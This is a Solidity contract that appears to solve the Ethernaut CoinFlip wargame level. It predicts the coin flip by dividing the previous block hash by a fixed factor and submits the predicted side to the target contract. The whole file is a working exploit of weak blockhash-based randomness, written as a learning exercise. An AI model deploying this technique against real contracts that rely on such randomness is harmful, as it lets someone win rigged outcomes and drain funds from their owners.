// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import 'interfaces/SafeMath.sol';
import '../contracts/CoinFlip.sol';

contract HackCoinFlip {
    // You complete the address of CoinFlip with the address of the instance in Ethernaut
    CoinFlip public originalContract = CoinFlip(0xFEe412DdEDE44682e911D4c333E4756c80af25B4);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip() public {
        // pre-deteremine the flip outcome
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Submit the correct side
        originalContract.flip(side);
    }
}
